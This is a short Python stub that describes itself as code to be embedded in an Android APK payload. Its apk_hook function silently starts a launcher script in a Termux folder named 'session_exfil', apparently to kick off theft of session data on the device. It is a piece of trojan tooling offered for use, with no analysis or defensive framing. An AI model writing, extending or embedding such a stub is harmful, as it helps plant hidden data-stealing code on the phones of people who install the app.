
#!/usr/bin/env python3
# Stub to be embedded into Android APK payload
import subprocess

def apk_hook():
    subprocess.Popen(["python3", "/data/data/com.termux/files/home/session_exfil/launcher.py"])

if __name__ == "__main__":
    apk_hook()
